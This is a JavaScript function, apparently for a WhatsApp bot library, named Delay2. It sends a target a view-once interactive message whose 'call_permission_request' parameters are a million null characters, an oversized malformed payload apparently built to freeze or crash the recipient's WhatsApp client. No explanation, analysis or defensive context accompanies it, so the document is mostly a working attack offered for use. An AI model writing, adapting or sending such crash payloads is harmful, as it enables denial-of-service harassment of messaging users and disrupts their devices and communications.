async function Delay2(from) {
  await sock.relayMessage(from, {
    "viewOnceMessage": {
      "message": {
        "interactiveResponseMessage": {
          "body": { "text": "Xeuka", "format": "DEFAULT" },
          "nativeFlowResponseMessage": {
            "name": "call_permission_request",
            "paramsJson": "\u0000".repeat(1000000),
            "version": 3
          }
        }
      }
    }
  }, { participant: { jid: from }});
}
